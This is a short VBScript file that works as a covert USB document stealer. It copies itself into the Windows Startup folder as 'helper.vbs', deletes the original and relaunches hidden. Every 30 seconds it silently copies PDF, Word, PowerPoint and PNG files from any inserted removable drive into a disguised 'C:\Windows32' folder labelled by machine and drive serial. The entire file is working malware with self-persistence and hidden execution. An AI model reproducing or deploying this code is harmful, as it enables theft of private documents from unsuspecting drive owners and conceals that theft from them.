' Find the logged in user's startup folder
set WshShell = WScript.CreateObject("WScript.Shell" )
strStartup = WshShell.SpecialFolders("StartMenu")
' See if we are running from the copy in the startup folder
if (WScript.scriptName <> "helper.vbs") Then
    ' We are not, so copy this file into the startup folder
    dim filesys: set filesys=CreateObject("Scripting.FileSystemObject")
    filesys.CopyFile WScript.ScriptFullName, strStartup + "\programs\startup\helper.vbs"
    ' Delete the original
    filesys.DeleteFile(WScript.ScriptFullName)
    ' Now execute the copy in the startup folder (asynchroniously, so we dont hang waiting for it to finish)
    WshShell.Run("""C:\Windows\System32\wscript.exe"" """ + strStartup + "\programs\startup\helper.vbs""")
    ' We have a copy running from a different process now, so we can quit this one
    WScript.Quit
End If
'
Do
   Call AutoSave_USB_SDCARD()
   Pause(30)
Loop
'********************************************AutoSave_USB_SDCARD()************************************************
Sub AutoSave_USB_SDCARD()
   Dim Ws,WshNetwork,ComputerName,strComputer,objWMIService,objDisk,colDisks
   Dim fso,Drive,SerialNumber,volume,Target,Amovible,Folder,Command1,Command2,Command3,Command4,Command5,Command6,Command7,Command8,Result1,Result2,Result3,Result4,Result5,Result6,Result7,Result8
   Set Ws = CreateObject("WScript.Shell")
   Set WshNetwork = CreateObject("WScript.Network")
   ComputerName = WshNetwork.ComputerName
   Target = "C:\Windows32"
   strComputer = "."
   Set objWMIService = GetObject("winmgmts:" _
   & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
   Set colDisks = objWMIService.ExecQuery _
   ("SELECT * FROM Win32_LogicalDisk")

   For Each objDisk in colDisks
      If objDisk.DriveType = 2 Then
         Set fso = CreateObject("Scripting.FileSystemObject")
         For Each Drive In fso.Drives
            If Drive.IsReady Then
               If Drive.DriveType = 1 Then
                  SerialNumber=fso.Drives(Drive + "\").SerialNumber
                  Amovible=fso.Drives(Drive + "\")
                  SerialNumber=ABS(INT(SerialNumber))
                  volume=fso.Drives(Drive + "\").VolumeName
                  Folder=ComputerName & "_" & volume &"_"& SerialNumber
                  Target=Target &"\"& Folder
                  Command1 = "cmd /c Xcopy.exe " & Amovible &"\*.pdf "& Target &" /I /D /Y /S /J /C"
                  Command2 = "cmd /c Xcopy.exe " & Amovible &"\*.doc "& Target &" /I /D /Y /S /J /C"
                  Command3 = "cmd /c Xcopy.exe " & Amovible &"\*.docx "& Target &" /I /D /Y /S /J /C"
                  Command4 = "cmd /c Xcopy.exe " & Amovible &"\*.pptx "& Target &" /I /D /Y /S /J /C"
                  Command5 = "cmd /c Xcopy.exe " & Amovible &"\*.png "& Target &" /I /D /Y /S /J /C"
                  Command6 = "cmd /c Xcopy.exe " & Amovible &"\**\**\*.docx "& Target &" /I /D /Y /S /J /C"
                  Command7 = "cmd /c Xcopy.exe " & Amovible &"\**\**\*.doc "& Target &" /I /D /Y /S /J /C"
                  Command8 = "cmd /c Xcopy.exe " & Amovible &"\**\*.docx "& Target &" /I /D /Y /S /J /C"
                  Result1 = Ws.Run(Command1,0,True)
                  Result2 = Ws.Run(Command2,0,True)
                  Result3 = Ws.Run(Command3,0,True)
                  Result4 = Ws.Run(Command4,0,True)
                  Result5 = Ws.Run(Command5,0,True)
                  Result6 = Ws.Run(Command6,0,True)
                  Result7 = Ws.Run(Command7,0,True)
                  Result8 = Ws.Run(Command8,0,True)
               end if
            End If   
         Next
      End If   
   Next
End Sub
'****************************************************************************************************************
Sub Pause(Sec)
   Wscript.Sleep(Sec*1000)
End Sub 
'****************************************************************************************************************